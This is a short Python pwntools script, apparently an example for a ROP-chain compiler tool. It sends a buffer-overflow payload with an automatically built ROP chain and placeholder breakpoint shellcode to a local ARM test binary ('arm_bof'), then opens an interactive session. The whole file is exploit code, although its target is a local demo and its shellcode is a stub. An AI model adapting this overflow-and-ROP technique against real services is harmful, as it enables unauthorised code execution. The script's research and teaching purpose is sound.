import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './example/arm_bof'
#options = ['qemu-arm']
options = ['ssh', 'armel']
options.extend([filename, '3000'])
#p = process(options)
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")
p = remote('localhost', 8888)

buffer_address = struct.unpack("<I", p.read(4))[0]

# TODO replay arm shellcode
shellcode = (
    "\x07\x00\x20\xe1"             # Breakpoint
)
target_address = buffer_address + 1024
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

print "Using automatically built ROP chain"
rop = ropme.rop_to_shellcode([(filename, 0)], target_address, archinfo.ArchARM, logging.DEBUG)

payload = 'A'*512 + 'B'*4 + rop
payload += ((1024 - len(payload)) * 'B') + shellcode
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
